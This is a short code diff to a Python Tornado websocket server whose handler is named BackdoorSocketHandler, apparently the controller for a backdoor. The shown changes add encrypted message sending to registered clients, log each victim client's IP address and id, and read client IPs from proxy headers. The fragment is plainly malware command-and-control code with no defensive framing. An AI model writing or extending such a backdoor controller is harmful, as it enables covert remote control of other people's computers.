@@ -1,6 +1,5 @@
 #!/usr/bin/env python
 # coding:utf-8
-import uuid
 import tornado.web
 import tornado.websocket
 import tornado.ioloop
@@ -40,13 +39,17 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
     def open(self):
         pass
 
+    def send_msg(self, data):
+        msg = {'data': self.encrypt(data)}
+        self.write_message(json.dumps(msg))
+
     def on_message(self, message):
         msg = json.loads(message)
         if 'id' in msg:
             self.ID = msg['id']
             self.SECRET = b64decode(msg['secret'])
             BackdoorSocketHandler.clients.add(self)
-            print 'new client'
+            print 'find new client: ' + self.request.remote_ip + '(' + self.ID + ')'
 
         if self.ID:
             if 'data' in msg:
@@ -62,7 +65,7 @@ def run_server():
         (r'/', BackdoorSocketHandler)
     ])
 
-    application.listen(8888)
+    application.listen(8888, xheaders=True)
     tornado.ioloop.IOLoop.instance().start()
 
 
